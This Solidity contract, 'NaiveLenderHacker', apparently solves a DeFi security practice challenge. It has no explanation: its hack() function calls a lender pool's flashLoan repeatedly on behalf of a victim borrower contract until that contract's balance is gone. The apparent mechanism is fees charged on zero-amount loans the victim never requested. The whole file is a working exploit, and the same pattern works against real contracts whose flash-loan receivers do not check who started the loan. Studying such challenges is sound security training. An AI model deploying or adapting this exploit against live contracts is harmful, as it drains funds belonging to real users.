// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
interface iLenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract NaiveLenderHacker {

    using Address for address payable;

    address payable private lenderPool;
    address payable private naiveLender;

    constructor(address payable pool, address payable lender) {
        lenderPool = pool;
        naiveLender = lender;
    }

    function hack() external payable {
        while(naiveLender.balance > 0) {
            iLenderPool(lenderPool).flashLoan(naiveLender, 0);
        }
    }
}